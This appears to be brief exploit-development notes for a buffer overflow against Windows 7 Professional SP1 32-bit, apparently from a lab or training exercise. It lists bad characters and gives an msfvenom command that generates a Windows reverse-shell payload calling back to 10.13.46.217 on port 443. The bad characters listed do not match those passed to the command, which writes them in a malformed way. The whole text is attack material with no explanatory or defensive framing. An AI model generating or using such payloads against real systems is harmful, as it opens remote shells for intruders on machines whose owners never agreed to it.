

Created for Windows 7 Professional SP1 32bits

Badchars: \x00\xa9\xcd\xd4

Msfvenom: msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\0x00\0x0a\0x0d" -v esp -f python
